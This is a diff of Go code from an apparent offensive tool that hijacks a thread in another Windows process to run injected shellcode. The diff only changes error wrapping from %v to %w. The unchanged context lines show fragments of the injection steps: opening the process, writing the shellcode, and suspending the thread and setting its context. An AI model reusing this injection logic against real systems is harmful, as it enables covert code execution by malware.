@@ -111,7 +111,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	} else {
 		hProcess, _, err = procOpenProcess.Call(uintptr(desiredAccess), 0, uintptr(pid))
 		if hProcess == 0 {
-			return sb.String(), fmt.Errorf("OpenProcess failed: %v", err)
+			return sb.String(), fmt.Errorf("OpenProcess failed: %w", err)
 		}
 	}
 	defer injectCloseHandle(hProcess)
@@ -121,7 +121,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	var scAddr uintptr
 	scAddr, err = injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to inject shellcode: %v", err)
+		return sb.String(), fmt.Errorf("failed to inject shellcode: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode written at: 0x%X (W^X enforced)\n", scAddr))
 
@@ -131,7 +131,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		// Auto-select: find first thread that isn't the main thread
 		targetTID, err = findHijackableThread(pid)
 		if err != nil {
-			return sb.String(), fmt.Errorf("failed to find hijackable thread: %v", err)
+			return sb.String(), fmt.Errorf("failed to find hijackable thread: %w", err)
 		}
 		sb.WriteString(fmt.Sprintf("[+] Auto-selected thread TID: %d\n", targetTID))
 	} else {
@@ -150,7 +150,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	} else {
 		hThread, _, err = procOpenThread.Call(uintptr(threadAccess), 0, uintptr(targetTID))
 		if hThread == 0 {
-			return sb.String(), fmt.Errorf("OpenThread failed: %v", err)
+			return sb.String(), fmt.Errorf("OpenThread failed: %w", err)
 		}
 	}
 	defer injectCloseHandle(hThread)
@@ -159,7 +159,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	// Step 5: Suspend thread
 	prevCount, _, err := procSuspendThread.Call(hThread)
 	if int32(prevCount) == -1 {
-		return sb.String(), fmt.Errorf("SuspendThread failed: %v", err)
+		return sb.String(), fmt.Errorf("SuspendThread failed: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Thread suspended (previous suspend count: %d)\n", prevCount))
 
@@ -177,7 +177,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		ret, _, err := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if ret == 0 {
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("GetThreadContext failed: %v", err)
+			return sb.String(), fmt.Errorf("GetThreadContext failed: %w", err)
 		}
 	}
 	originalRip := ctx.Rip
@@ -198,7 +198,7 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 		ret, _, err := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 		if ret == 0 {
 			resumeThread(&sb, hThread)
-			return sb.String(), fmt.Errorf("SetThreadContext failed: %v", err)
+			return sb.String(), fmt.Errorf("SetThreadContext failed: %w", err)
 		}
 	}
 	sb.WriteString("[+] Thread context updated\n")
@@ -235,7 +235,7 @@ func resumeThread(sb *strings.Builder, hThread uintptr) {
 func findHijackableThread(pid uint32) (uint32, error) {
 	snapshot, _, err := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
 	if snapshot == uintptr(^uintptr(0)) { // INVALID_HANDLE_VALUE
-		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
+		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
 	}
 	defer injectCloseHandle(snapshot)
 
@@ -244,7 +244,7 @@ func findHijackableThread(pid uint32) (uint32, error) {
 
 	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
 	if ret == 0 {
-		return 0, fmt.Errorf("Thread32First failed: %v", err)
+		return 0, fmt.Errorf("Thread32First failed: %w", err)
 	}
 
 	var mainTID uint32
